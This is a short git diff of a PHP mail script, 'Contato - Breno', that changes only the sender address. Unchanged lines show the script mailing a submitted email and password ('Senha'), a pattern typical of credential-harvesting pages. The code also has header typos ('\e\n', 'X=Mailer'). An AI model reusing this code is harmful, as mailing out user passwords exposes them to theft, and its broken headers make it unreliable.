@@ -11,7 +11,7 @@ $subject = "Contato - Breno";
 $body = "Email: ".$email. "\r\n".
         "Senha: ".$senha. "\r\n".
         "Mensagem: ".$mensagem;
-$header = "From:brenolins100@gmail.com".
+$header = "From:pinguin123a@gmail.com".
     "Reply-To:".$email. "\e\n".
     "X=Mailer:PHP/".phpversion();
 
